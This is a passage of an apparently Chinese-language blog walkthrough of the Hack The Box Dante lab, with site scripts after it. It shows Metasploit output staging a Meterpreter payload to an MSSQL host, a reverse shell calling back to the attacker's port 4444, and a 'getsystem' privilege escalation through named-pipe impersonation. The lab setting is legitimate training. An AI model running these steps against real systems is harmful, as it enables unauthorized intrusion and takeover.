<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   4.40% <span class="k">done</span> <span class="o">(</span>4497/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   5.86% <span class="k">done</span> <span class="o">(</span>5996/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   7.33% <span class="k">done</span> <span class="o">(</span>7495/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -   8.80% <span class="k">done</span> <span class="o">(</span>8994/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  10.26% <span class="k">done</span> <span class="o">(</span>10493/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  11.73% <span class="k">done</span> <span class="o">(</span>11992/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  13.19% <span class="k">done</span> <span class="o">(</span>13491/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  14.66% <span class="k">done</span> <span class="o">(</span>14990/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  16.13% <span class="k">done</span> <span class="o">(</span>16489/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  17.59% <span class="k">done</span> <span class="o">(</span>17988/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  19.06% <span class="k">done</span> <span class="o">(</span>19487/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  20.53% <span class="k">done</span> <span class="o">(</span>20986/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  21.99% <span class="k">done</span> <span class="o">(</span>22485/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  23.46% <span class="k">done</span> <span class="o">(</span>23984/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  24.92% <span class="k">done</span> <span class="o">(</span>25483/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  26.39% <span class="k">done</span> <span class="o">(</span>26982/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  27.86% <span class="k">done</span> <span class="o">(</span>28481/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  29.32% <span class="k">done</span> <span class="o">(</span>29980/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  30.79% <span class="k">done</span> <span class="o">(</span>31479/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  32.25% <span class="k">done</span> <span class="o">(</span>32978/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  33.72% <span class="k">done</span> <span class="o">(</span>34477/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  35.19% <span class="k">done</span> <span class="o">(</span>35976/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  36.65% <span class="k">done</span> <span class="o">(</span>37475/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  38.12% <span class="k">done</span> <span class="o">(</span>38974/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  39.58% <span class="k">done</span> <span class="o">(</span>40473/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  41.05% <span class="k">done</span> <span class="o">(</span>41972/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  42.52% <span class="k">done</span> <span class="o">(</span>43471/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  43.98% <span class="k">done</span> <span class="o">(</span>44970/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  45.45% <span class="k">done</span> <span class="o">(</span>46469/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  46.91% <span class="k">done</span> <span class="o">(</span>47968/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  48.38% <span class="k">done</span> <span class="o">(</span>49467/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  49.85% <span class="k">done</span> <span class="o">(</span>50966/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  51.31% <span class="k">done</span> <span class="o">(</span>52465/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  52.78% <span class="k">done</span> <span class="o">(</span>53964/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  54.24% <span class="k">done</span> <span class="o">(</span>55463/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  55.71% <span class="k">done</span> <span class="o">(</span>56962/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  57.18% <span class="k">done</span> <span class="o">(</span>58461/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  58.64% <span class="k">done</span> <span class="o">(</span>59960/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  60.11% <span class="k">done</span> <span class="o">(</span>61459/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  61.58% <span class="k">done</span> <span class="o">(</span>62958/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  63.04% <span class="k">done</span> <span class="o">(</span>64457/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  64.51% <span class="k">done</span> <span class="o">(</span>65956/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  65.97% <span class="k">done</span> <span class="o">(</span>67455/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  67.44% <span class="k">done</span> <span class="o">(</span>68954/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  68.91% <span class="k">done</span> <span class="o">(</span>70453/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  70.37% <span class="k">done</span> <span class="o">(</span>71952/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  71.84% <span class="k">done</span> <span class="o">(</span>73451/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  73.30% <span class="k">done</span> <span class="o">(</span>74950/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  74.77% <span class="k">done</span> <span class="o">(</span>76449/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  76.24% <span class="k">done</span> <span class="o">(</span>77948/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  77.70% <span class="k">done</span> <span class="o">(</span>79447/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  79.17% <span class="k">done</span> <span class="o">(</span>80946/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  80.63% <span class="k">done</span> <span class="o">(</span>82445/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  82.10% <span class="k">done</span> <span class="o">(</span>83944/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  83.57% <span class="k">done</span> <span class="o">(</span>85443/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  85.03% <span class="k">done</span> <span class="o">(</span>86942/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  86.50% <span class="k">done</span> <span class="o">(</span>88441/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  87.96% <span class="k">done</span> <span class="o">(</span>89940/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  89.43% <span class="k">done</span> <span class="o">(</span>91439/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  90.90% <span class="k">done</span> <span class="o">(</span>92938/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  92.36% <span class="k">done</span> <span class="o">(</span>94437/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  93.83% <span class="k">done</span> <span class="o">(</span>95936/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  95.29% <span class="k">done</span> <span class="o">(</span>97435/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  96.76% <span class="k">done</span> <span class="o">(</span>98934/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  98.19% <span class="k">done</span> <span class="o">(</span>100400/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress -  99.59% <span class="k">done</span> <span class="o">(</span>101827/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.5:1433 - Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>102246/102246 bytes<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175686 bytes<span class="o">)</span> to 10.10.110.3
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 16 opened <span class="o">(</span>10.10.14.5:4444 -&gt; 10.10.110.3:19751<span class="o">)</span> at 2024-01-01 22:48:21 <span class="nt">-0500</span>
</code></pre></div></div>

<p>è·å¾— shell ååœ¨ c:\Users ç›®å½•ä¸­å¯ä»¥å‘ç° flag.txt</p>
<h2 id="ææƒ-printspooler">ææƒ: PrintSpooler</h2>
<p>MSSQL ç”¨æˆ·ä¸€èˆ¬æ‹¥æœ‰ SeImpersonatePrivilege æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ Potato å®¶æ—ææƒï¼ŒMSF ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨ getsystem å‘½ä»¤ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> getsystem 
...got system via technique 5 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>PrintSpooler variant<span class="o">))</span><span class="nb">.</span>
</code></pre></div></div>

<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<ul>
  <li><a href="https://mega.nz/folder/J7VSgZiD#WzxgZ6mpK8YXotGDFQRWww">Dante by Tamarisk</a></li>
  <li><a href="https://blog.snert.cn/index.php/2023/05/16/htb-dante-walkthrough/">HTB Dante Walkthrough â€“ rainb0wâ€™s blog</a></li>
  <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress">Wordpress - HackTricks</a></li>
</ul>
</div>
<section class="article__sharing d-print-none"></section><div class="d-print-none">
<footer class="article__footer"><meta itemprop="dateModified" content="2024-01-02T18:29:48+08:00">
<!-- start custom article footer snippet -->

<!-- end custom article footer snippet -->
<div class="article__subscribe">
<div class="subscribe">
<i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a>
</div>
</div>
<div class="article__license"><div class="license">
    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png">
      </a>
    </p>
  </div></div></footer>
<div class="article__section-navigator clearfix">
<div class="previous">
<span>PREVIOUS</span><a href="/ctf/2023/12/19/QWB-2023-writeup.html">QWB 2023 Writeup</a>
</div>
<div class="next">
<span>NEXT</span><a href="/env/2024/01/02/Migrate-gitbook-to-mkdocs.html">å°† gitbook è¿ç§»åˆ° mkdocs</a>
</div>
</div>
</div>

</div>

<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    $(function() {
      var $this ,$scroll;
      var $articleContent = $('.js-article-content');
      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
      $scroll = $(scroll);

      $articleContent.find('.highlight').each(function() {
        $this = $(this);
        $this.attr('data-lang', $this.find('code').attr('data-lang'));
      });
      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
        $this = $(this);
        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
      });
      $articleContent.on('click', '.anchor', function() {
        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
      });
    });
  });
})();
</script>
</div>
<section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->

<!-- end custom main bottom snippet -->
</div>
            </div></div></div>
<div class="page__footer d-print-none">
<footer class="footer py-4 js-page-footer">
  <div class="main">
<div itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="DumKiy">
<meta itemprop="url" content="/">
<meta itemprop="description" content="Watch And Learn.">
<div class="footer__author-links">
<div class="author-links">
  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
          <div class="icon">
<svg fill="#000000" width="24px" height="24px" viewbox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z"></path>
</svg>
</div>
        </a>
      </li></ul>
</div>
</div>
    </div>
<div class="site-info mt-2">
      <div>Â© DumKiy's blog 2021,
        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
      </div>
    </div>
  </div>
</footer>
</div>
</div>
    </div>
<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $body = $('body'), $window = $(window);
    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
    var activeCount = 0;
    function modal(options) {
      var $root = this, visible, onChange, hideWhenWindowScroll = false;
      var scrollTop;
      function setOptions(options) {
        var _options = options || {};
        visible = _options.initialVisible === undefined ? false : show;
        onChange = _options.onChange;
        hideWhenWindowScroll = _options.hideWhenWindowScroll;
      }
      function init() {
        setState(visible);
      }
      function setState(isShow) {
        if (isShow === visible) {
          return;
        }
        visible = isShow;
        if (visible) {
          activeCount++;
          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
          $root.addClass('modal--show');
          $pageMain.scrollTop(scrollTop);
          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
          $window.on('keyup', handleKeyup);
        } else {
          activeCount > 0 && activeCount--;
          $root.removeClass('modal--show');
          $window.scrollTop(scrollTop);
          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
          $window.off('keyup', handleKeyup);
        }
        onChange && onChange(visible);
      }
      function show() {
        setState(true);
      }
      function hide() {
        setState(false);
      }
      function handleKeyup(e) {
        // Char Code: 27  ESC
        if (e.which ===  27) {
          hide();
        }
      }
      setOptions(options);
      init();
      return {
        show: show,
        hide: hide,
        $el: $root
      };
    }
    $.fn.modal = modal;
  });
})();
</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal">
<script>
(function () {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    // search panel
    var search = (window.search || (window.search = {}));
    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
      true : window.useDefaultSearchBox ;

    var $searchModal = $('.js-page-search-modal');
    var $searchToggle = $('.js-search-toggle');
    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
    var modalVisible = false;
    search.searchModal = searchModal;

    var $searchBox = null;
    var $searchInput = null;
    var $searchClear = null;

    function getModalVisible() {
      return modalVisible;
    }
    search.getModalVisible = getModalVisible;

    function handleModalChange(visible) {
      modalVisible = visible;
      if (visible) {
        search.onShow && search.onShow();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
      } else {
        search.onShow && search.onHide();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
        setTimeout(function() {
          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
          search.clear && search.clear();
          window.pageAsideAffix && window.pageAsideAffix.refresh();
        }, 400);
      }
    }

    $searchToggle.on('click', function() {
      modalVisible ? searchModal.hide() : searchModal.show();
    });
    // Char Code: 83  S, 191 /
    $(window).on('keyup', function(e) {
      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
        modalVisible || searchModal.show();
      }
    });

    if (useDefaultSearchBox) {
      $searchBox = $('.js-search-box');
      $searchInput = $searchBox.children('input');
      $searchClear = $searchBox.children('.js-icon-clear');
      search.getSearchInput = function() {
        return $searchInput.get(0);
      };
      search.getVal = function() {
        return $searchInput.val();
      };
      search.setVal = function(val) {
        $searchInput.val(val);
      };

      $searchInput.on('focus', function() {
        $(this).addClass('focus');
      });
      $searchInput.on('blur', function() {
        $(this).removeClass('focus');
      });
      $searchInput.on('input', window.throttle(function() {
        var val = $(this).val();
        if (val === '' || typeof val !== 'string') {
          search.clear && search.clear();
        } else {
          $searchBox.addClass('not-empty');
          search.onInputNotEmpty && search.onInputNotEmpty(val);
        }
      }, 400));
      $searchClear.on('click', function() {
        $searchInput.val(''); $searchBox.removeClass('not-empty');
        search.clear && search.clear();
      });
    }
  });
})();
</script><div class="search search--dark">
  <div class="main">
    <div class="search__header">Search</div>
    <div class="search-bar">
      <div class="search-box js-search-box">
        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
        <input type="text">
        <div class="search-box__icon-clear js-icon-clear">
          <a><i class="fas fa-times"></i></a>
        </div>
      </div>
      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
        Cancel</button>
    </div>
    <div class="search-result js-search-result"></div>
  </div>
</div>
<script>var SOURCES = window.TEXT_VARIABLES.sources;
var PAHTS = window.TEXT_VARIABLES.paths;
window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
  var search = (window.search || (window.search = {}));
  var searchData = window.TEXT_SEARCH_DATA || {};

  function memorize(f) {
    var cache = {};
    return function () {
      var key = Array.prototype.join.call(arguments, ',');
      if (key in cache) return cache[key];
      else return cache[key] = f.apply(this, arguments);
    };
  }

  /// search
  function searchByQuery(query) {
    var i, j, key, keys, cur, _title, result = {};
    keys = Object.keys(searchData);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      for (j = 0; j < searchData[key].length; j++) {
        cur = searchData[key][j], _title = cur.title;
        if ((result[key] === undefined || result[key] && result[key].length < 4 )
          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
          if (result[key] === undefined) {
            result[key] = [];
          }
          result[key].push(cur);
        }
      }
    }
    return result;
  }

  var renderHeader = memorize(function(header) {
    return $('<p class="search-result__header">' + header + '</p>');
  });

  var renderItem = function(index, title, url) {
    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
  };

  function render(data) {
    if (!data) { return null; }
    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
    keys = Object.keys(data);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      $root.append(renderHeader(key));
      for (j = 0; j < data[key].length; j++) {
        cur = data[key][j];
        $root.append(renderItem(itemIndex++, cur.title, cur.url));
      }
    }
    return $root;
  }

  // search box
  var $result = $('.js-search-result'), $resultItems;
  var lastActiveIndex, activeIndex;

  function clear() {
    $result.html(null);
    $resultItems = $('.search-result__item'); activeIndex = 0;
  }
  function onInputNotEmpty(val) {
    $result.html(render(searchByQuery(val)));
    $resultItems = $('.search-result__item'); activeIndex = 0;
    $resultItems.eq(0).addClass('active');
  }

  search.clear = clear;
  search.onInputNotEmpty = onInputNotEmpty;

  function updateResultItems() {
    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
  }

  function moveActiveIndex(direction) {
    var itemsCount = $resultItems ? $resultItems.length : 0;
    if (itemsCount > 1) {
      lastActiveIndex = activeIndex;
      if (direction === 'up') {
        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
      } else if (direction === 'down') {
        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
      }
      updateResultItems();
    }
  }

  // Char Code: 13  Enter, 37  â¬…, 38  â¬†, 39  â¡, 40  â¬‡
  $(window).on('keyup', function(e) {
    var modalVisible = search.getModalVisible && search.getModalVisible();
    if (modalVisible) {
      if (e.which === 38) {
        modalVisible && moveActiveIndex('up');
      } else if (e.which === 40) {
        modalVisible && moveActiveIndex('down');
      } else if (e.which === 13) {
        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
      }
    }
  });

  $result.on('mouseover', '.search-result__item > a', function() {
    var itemIndex = $(this).parent().data('index');
    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
  });
});
</script>
</div>
</div>


<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function scrollToAnchor(anchor, duration, callback) {
      var $root = this;
      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
        callback && callback();
      });
    }
    $.fn.scrollToAnchor = scrollToAnchor;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function affix(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroll,
        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
        hasInit = false, curState;

      function setOptions(options) {
        var _options = options || {};
        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroll && (scroll = _options.scroll);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $scrollTarget = $(scrollTarget);
        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
        $scroll = $(scroll);
      }
      function preCalc() {
        top();
        rootHeight = $root.outerHeight();
        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
        rootLeft = $root.offset().left;
      }
      function calc(needPreCalc) {
        needPreCalc && preCalc();
        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
        rootBottomTop = scrollBottom - rootTop;
      }
      function top() {
        if (curState !== 'top') {
          $root.removeClass('fixed').css({
            left: 0,
            top: 0
          });
          curState = 'top';
        }
      }
      function fixed() {
        if (curState !== 'fixed') {
          $root.addClass('fixed').css({
            left: rootLeft + 'px',
            top: 0
          });
          curState = 'fixed';
        }
      }
      function bottom() {
        if (curState !== 'bottom') {
          $root.removeClass('fixed').css({
            left: 0,
            top: rootBottomTop + 'px'
          });
          curState = 'bottom';
        }
      }
      function setState() {
        var scrollTop = $scrollTarget.scrollTop();
        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
          fixed();
        } else if (scrollTop < rootTop) {
          top();
        } else {
          bottom();
        }
      }
      function init() {
        if(!hasInit) {
          var interval, timeout;
          calc(true); setState();
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState();
          });
          $window.on('resize', function() {
            disabled || (calc(true), setState());
          });
          hasInit = true;
        }
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions,
        refresh: function() {
          calc(true, { animation: false }); setState();
        }
      };
    }
    $.fn.affix = affix;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function toc(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
        headingsPos, scrolling = false, hasRendered = false, hasInit = false;

      function setOptions(options) {
        var _options = options || {};
        _options.selectors && (selectors = _options.selectors);
        _options.container && (container = _options.container);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroller && (scroller = _options.scroller);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $headings = $(container).find(selectors).filter('[id]');
        $scrollTarget = $(scrollTarget);
        $scroller = $(scroller);
      }
      function calc() {
        headingsPos = [];
        $headings.each(function() {
          headingsPos.push(Math.floor($(this).position().top));
        });
      }
      function setState(element, disabled) {
        var scrollTop = $scrollTarget.scrollTop(), i;
